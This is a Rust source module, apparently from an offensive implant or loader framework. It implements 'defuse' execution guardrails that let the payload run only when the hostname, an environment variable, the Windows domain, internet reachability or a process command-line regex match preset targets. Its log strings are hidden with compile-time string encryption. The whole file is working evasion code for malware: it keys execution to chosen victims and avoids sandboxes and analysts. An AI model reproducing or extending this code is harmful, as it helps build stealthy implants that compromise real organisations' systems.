use crate::config::CCC;
use crate::link::{LH, Lk, LinkFetch};

use gethostname::gethostname;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::env;

use cryptify::encrypt_string;
use log::debug;
#[cfg(target_os = "windows")]
use log::error;
use log::warn;

#[derive(Serialize, Deserialize, Clone)]
pub enum DF {
    #[serde(rename = "h")]
    Hostname(Hostname),
    #[serde(rename = "e")]
    Env(Env),
    #[serde(rename = "d")]
    DOJ(DOJ), //DomainJoin
    CI(CI), //CheckInternet
    #[serde(rename = "cc")]
    Command(Command),
}
impl DF {
    pub fn stop_the_exec(&self, config: &CCC) -> bool {
        match self {
            DF::Hostname(hostname) => hostname.stop_exec(config),
            DF::DOJ(domain_join) => domain_join.stop_exec(config),
            DF::CI(ci) => ci.stop_exec(config),
            DF::Env(env_variable) => env_variable.stop_exec(config),
            DF::Command(comm) => comm.stop_exec(config),
        }
    }
    pub fn get_operator(&self) -> Operator {
        match self {
            DF::Hostname(hostname) => hostname.get_operator(),
            DF::DOJ(domain_join) => domain_join.get_operator(),
            DF::CI(ci) => ci.get_operator(),
            DF::Env(env_variable) => env_variable.get_operator(),
            DF::Command(comm) => comm.get_operator(),
        }
    }
}

#[derive(Serialize, Deserialize, Clone, Copy)]
#[serde(rename = "oo")]
pub enum Operator {
    AND,
    OR,
}

pub trait DefuseCheck {
    fn stop_exec(&self, config: &CCC) -> bool;
    fn get_operator(&self) -> Operator;
}

#[derive(Serialize, Deserialize, Clone)]
#[serde(rename = "ci")]
pub struct CI { //CI
    pub list: Vec<String>,
    pub operator: Operator,
}
impl DefuseCheck for CI {
    fn stop_exec(&self, config: &CCC) -> bool {
        for url in &self.list {
            debug!("{}{}", encrypt_string!("check internet: "), url);
            let link: Lk = Lk::LH(LH {
                url: url.to_string(),
                dataoperation: vec![],
                jitt: 0,
                sleep: 0,
            });
            match link.fetch_data(config) {
                Ok(_) => return false,
                Err(error) => {
                    warn!("{}{}", encrypt_string!("error: "), error);
                    continue;
                }
            };
        }
        true
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}

#[derive(Serialize, Deserialize, 
    Clone)]
#[serde(rename = "ht")]
pub struct Hostname {
    #[serde(rename = "lt")]
    pub list: Vec<String>,
    #[serde(rename = "oa")]
    pub operator: Operator,
}
impl DefuseCheck for Hostname {
    fn stop_exec(&self, _config: &CCC) -> bool {
        //TODO virer le unwrap
        let hostname = gethostname()
            .to_ascii_uppercase()
            .to_os_string()
            .into_string()
            .unwrap();
        debug!("Hostname: {:?}", gethostname().to_ascii_uppercase());
        for defuse_hostname in &self.list {
            let defuse_to_upper = defuse_hostname.to_ascii_uppercase();
            if defuse_to_upper == hostname {
                debug!(
                    "{}{:?} ",
                    encrypt_string!("Defuse MATCH: "),
                    defuse_to_upper
                );
                return false;
            } else {
                debug!("{}{:?} ", encrypt_string!("Defuse FAIL: "), defuse_to_upper);
            }
        }
        true
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Env {
    pub var: String,
    pub value: String,
    pub operator: Operator,
}
impl DefuseCheck for Env {
    fn stop_exec(&self, _config: &CCC) -> bool {
        match env::var(&self.var) {
            Ok(value) => {
                if value == self.value {
                    debug!(
                        "{}{}]={:?}",
                        encrypt_string!("Defuse MATCH: env["),
                        &self.var,
                        env::var(&self.var).unwrap()
                    );
                    false
                } else {
                    debug!(
                        "{}{}]={:?}{}{}",
                        encrypt_string!("Defuse FAIL: env["),
                        &self.var,
                        env::var(&self.var).unwrap(),
                        encrypt_string!(" instead of "),
                        self.value
                    );
                    true
                }
            }
            _ => {
                debug!(
                    "{}{}{}",
                    encrypt_string!("Defuse FAIL: env["),
                    &self.var,
                    encrypt_string!("] is empty")
                );
                true
            }
        }
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}

#[cfg(target_os = "windows")]
use windows_sys::Win32::{
    Foundation::ERROR_SUCCESS,
    Networking::ActiveDirectory::{DsGetDcNameA, DOMAIN_CONTROLLER_INFOA},
};

#[derive(Serialize, Deserialize, Clone)]
pub struct DOJ {
    pub list: Vec<String>,
    pub operator: Operator,
}

#[cfg(target_os = "linux")]
impl DefuseCheck for DOJ {
    fn stop_exec(&self, _config: &CCC) -> bool {
        true
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}

#[cfg(target_os = "windows")]
impl DefuseCheck for DOJ {
    fn stop_exec(&self, _config: &CCC) -> bool {
        let mut domain_controller_info: *mut DOMAIN_CONTROLLER_INFOA = std::ptr::null_mut();
        let status = unsafe {
            DsGetDcNameA(
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                &mut domain_controller_info,
            )
        };

        if status != ERROR_SUCCESS {
            error!(
                "{}",
                encrypt_string!("Defuse FAIL: Failed to get domain controller info")
            );
            return true;
        }

        let domain_name = unsafe { (*domain_controller_info).DomainName };
        debug!("Domain Name: {}", unsafe {
            std::ffi::CStr::from_ptr(domain_name as _)
                .to_str()
                .unwrap()
                .to_ascii_uppercase()
        });

        for domain in &self.list {
            //let defuse_to_upper = domain.to_ascii_uppercase();
            let defuse_to_upper = domain.to_ascii_lowercase();

            if defuse_to_upper
                == unsafe { std::ffi::CStr::from_ptr(domain_name as _).to_str().unwrap() }
            {
                debug!("{}{:?}", encrypt_string!("Defuse MATCH: "), defuse_to_upper);
                return false;
            } else {
                debug!("{}{:?}", encrypt_string!("Defuse FAIL: "), defuse_to_upper);
            }
        }
        true
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}

#[derive(Serialize, Deserialize, Clone)]
pub struct Command {
    pub regex: String,
    pub operator: Operator,
}
impl DefuseCheck for Command {
    fn stop_exec(&self, _config: &CCC) -> bool {
        //let cmdline = String::from(r#"^.*-Xms512M -Xmx4096M .*-Dclipchamp.session.id.*clipchamp-tools.jar.*--workflow=ingest"#);
        // -Xms512M -Xmx4096M -Dclipchamp.session.id clipchamp-tools.jar --workflow=ingest+analyze+render
        // Construit la ligne de commande complète
        let full_cmdline: String = env::args().collect::<Vec<_>>().join(" ");

        // Compile la regex
        match Regex::new(&self.regex) {
            Ok(re) => {
                if re.is_match(&full_cmdline) {
                    debug!("{}", encrypt_string!("Defuse MATCH: regex ok"));
                    return false;
                } else {
                    debug!(
                        "{}{:?}",
                        encrypt_string!("Defuse FAIL: regex not match: "),
                        self.regex
                    );
                    return true;
                }
            }
            Err(e) => {
                debug!(
                    "{}{:?}{}{}",
                    encrypt_string!("Defuse FAIL: regex not match: "),
                    self.regex,
                    encrypt_string!(" ,error="),
                    e
                );
                return true;
            }
        }
    }
    fn get_operator(&self) -> Operator {
        self.operator
    }
}
